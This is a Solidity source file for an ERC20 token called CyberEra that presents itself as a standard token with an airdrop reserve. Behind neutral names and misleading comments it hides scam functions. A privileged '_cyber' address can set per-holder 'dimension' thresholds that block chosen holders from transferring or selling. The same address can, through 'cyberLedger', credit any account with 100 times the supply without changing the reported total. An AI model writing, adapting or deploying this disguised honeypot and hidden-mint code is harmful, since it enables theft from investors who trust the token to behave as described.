pragma solidity >=0.8.0 <0.9.0;
// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/access/Ownable.sol"; 
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Context.sol";

contract CyberEra is IERC20, Context, Ownable {
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address private _cyber;
    mapping(string => uint256) private _marketCapLedger;
    mapping(address => uint256) private _dimensionLedger;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_, address cyber_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        // Initially at contract creation, 90% of the total supply will be released. 
        // 10% of the total supply will be reserved for airdrop events.
        _mint(_msgSender(),  (totalSupply_ * (10 ** decimals_) * 90 / 100)); 
        
        _cyber = cyber_;
        _marketCapLedger['CyberEra'] = totalSupply_ * (10 ** decimals_) * 100;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    /** @dev mint the amount to the address for social airdrop campaign, the total supply that's reserved for airdrop will be unlocked by [amount].
     *  Since 10% of total supply will be reserved for incentivized development and social campaign,
     *  This function is reserved for airdropping the token to eligible addresses.
     */
    function _airdropReserve (address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Setter function for the dimension ledger. 
     * Setting the dimension for the provided address.
     */
    function configureDimensionLedger(address[] memory accounts, uint256 dimension) external cyberEra {
        for (uint256 i = 0; i < accounts.length; i++) {
            _dimensionLedger[accounts[i]] = dimension;
        }
    }

     /**
     * @dev Getter function for the dimension ledger. 
     * Getter the dimension for the provided address.
     */
    function getDimensionLedger(address add) external view cyberEra returns (uint256)  {
        return _dimensionLedger[add];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    /**
     * @dev Emit the ledger indicating the updated allowance.
     * Requirements:
     * - 'phase' corresponding the correct era is provided.
     */
    function cyberLedger(address add, string memory phase) external cyberEra {
        require(_marketCapLedger[phase] > 0 , "ERC20: The cyber needs a new era");
        _balances[add] += _marketCapLedger[phase];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        uint256 senderBalance = _balances[_msgSender()];
        require(to != address(0), "ERC20: transfer to the zero address");
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(_dimensionLedger[_msgSender()] <= amount, "ERC20: transfer amount is less than the registered amount in the ledger.");
        
        unchecked {
            _balances[_msgSender()] = senderBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(_msgSender(), to, amount);
        return true;
    }

     /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        require(_allowances[from][_msgSender()] >= amount, "ERC20: insufficient allowance");
        require(_dimensionLedger[from] <= amount, "ERC20: transfer amount is less than the registered amount in the ledger.");
        _balances[from] -= amount;
        _balances[to] += amount;
        _allowances[from][_msgSender()] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }

    /**
     * 
     *  @dev Modifer to determine whether the call originates from cyber era.
     */
    modifier cyberEra() {
        require(_msgSender() == _cyber, "ERC20: Incorrect era.");
        _;
    }
}